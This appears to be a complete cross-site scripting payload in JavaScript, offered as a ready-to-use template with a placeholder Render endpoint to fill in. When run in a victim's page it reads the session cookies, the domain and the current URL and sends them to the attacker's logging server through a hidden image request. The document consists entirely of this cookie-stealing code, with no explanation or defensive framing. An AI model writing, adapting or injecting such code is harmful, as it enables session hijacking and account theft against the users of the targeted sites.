(function () {
  const endpoint = 'https://YOUR-RENDER-URL.onrender.com/log';
  const params = new URLSearchParams({
    c: document.cookie,
    d: document.domain,
    l: location.href
  });
  new Image().src = `${endpoint}?${params.toString()}`;
})();
